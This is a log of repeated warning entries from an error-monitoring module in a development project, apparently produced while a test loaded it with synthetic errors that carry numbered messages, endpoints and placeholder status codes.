WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742284Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1058'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742333Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1059'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742383Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1060'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742433Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1061'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742482Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1062'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742531Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1063'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742579Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1064'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1065'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1066'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742722Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1067'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742770Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1068'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742818Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1069'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1070'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742915Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1071'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.742962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1072'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743010Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1073'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1074'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743105Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1075'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743153Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1076'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743202Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1077'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743252Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1078'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743304Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1079'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1080'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1081'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743456Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1082'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743505Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1083'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743554Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1084'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743603Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1085'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743652Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1086'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743700Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1087'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743790Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1088'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1089'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743924Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1090'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.743976Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1091'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744027Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1092'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744076Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1093'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744126Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1094'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744175Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1095'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744223Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1096'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.744271Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m22[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1097'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
